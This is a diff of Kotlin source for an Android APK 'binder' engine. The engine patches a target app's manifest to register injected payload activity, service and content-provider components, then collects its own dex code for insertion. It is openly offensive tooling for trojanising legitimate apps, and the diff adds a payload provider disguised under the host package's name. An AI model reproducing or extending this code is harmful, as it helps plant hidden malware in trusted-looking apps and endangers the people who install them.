@@ -102,14 +102,12 @@ class BinderEngine(private val ctx: Context) {
             val allEntries = srcZip.entries().toList()
             val stored = allEntries.filter { it.method == ZipEntry.STORED }
             emit(LogLevel.INFO, "Entries: " + allEntries.size + "  stored: " + stored.size)
-            emit(LogLevel.INFO, "Stored sample: " + stored.take(3).joinToString(", ") { it.name })
 
             val manifestEntry = srcZip.getEntry("AndroidManifest.xml")
                 ?: throw IllegalStateException("No AndroidManifest.xml in APK")
             val manifest = srcZip.getInputStream(manifestEntry).use { it.readBytes() }
 
             emit(LogLevel.INFO, "Original manifest: " + AxmlPatcher.stats(manifest))
-            emit(LogLevel.INFO, "Original app attrs: " + AxmlPatcher.appAttrs(manifest))
 
             val originalApp = AxmlPatcher.readApplicationName(manifest)
             emit(LogLevel.INFO, "Original application: " + (originalApp ?: "(none)"))
@@ -118,9 +116,10 @@ class BinderEngine(private val ctx: Context) {
             val patched = try {
                 AxmlPatcher.patch(
                     manifest,
-                    Const.PAYLOAD_APP,
                     Const.PAYLOAD_ACTIVITY,
                     Const.PAYLOAD_SERVICE,
+                    Const.PAYLOAD_PROVIDER,
+                    (originalInfo?.packageName ?: "hs.binder") + ".hsbinder",
                     permissions
                 )
             } catch (t: Throwable) {
@@ -129,7 +128,6 @@ class BinderEngine(private val ctx: Context) {
             }
             emit(LogLevel.SUCCESS, "Manifest patched: " + manifest.size + " -> " + patched.size)
             emit(LogLevel.INFO, "App attrs: " + AxmlPatcher.appAttrs(patched))
-            emit(LogLevel.INFO, "Patched stats: " + AxmlPatcher.stats(patched))
 
             emit(LogLevel.INFO, "Collecting payload dex...")
             val dexes = collectOwnDex()
